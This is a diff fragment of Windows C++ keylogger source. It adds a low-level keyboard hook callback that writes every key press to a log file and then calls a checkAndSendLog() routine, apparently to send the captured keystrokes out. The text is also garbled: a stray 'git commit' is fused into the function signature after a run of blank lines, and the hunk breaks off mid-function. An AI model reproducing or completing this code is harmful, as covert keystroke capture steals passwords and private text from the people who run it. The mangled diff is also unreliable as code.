@@ -69,3 +69,29 @@ int main() {
     UnhookWindowsHookEx(keyboardHook);
     return 0;
 }
+
+
+
+
+
+
+
+git commit LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
+        int key = kbdStruct->vkCode;
+
+        if (wParam == WM_KEYDOWN && pressedKeys.find(key) == pressedKeys.end()) {
+            pressedKeys.insert(key);
+            if (isPrintableChar(key)) {
+                logFile.put(static_cast<char>(key));
+            } else if (key == VK_RETURN) {
+                logFile.put('\n');
+            } else if (key == VK_SPACE) {
+                logFile.put(' ');
+            }
+            logFile.flush();
+            checkAndSendLog();
+        } else if (wParam == WM_KEYUP) {
+            pressedKeys.erase(key);
+        }
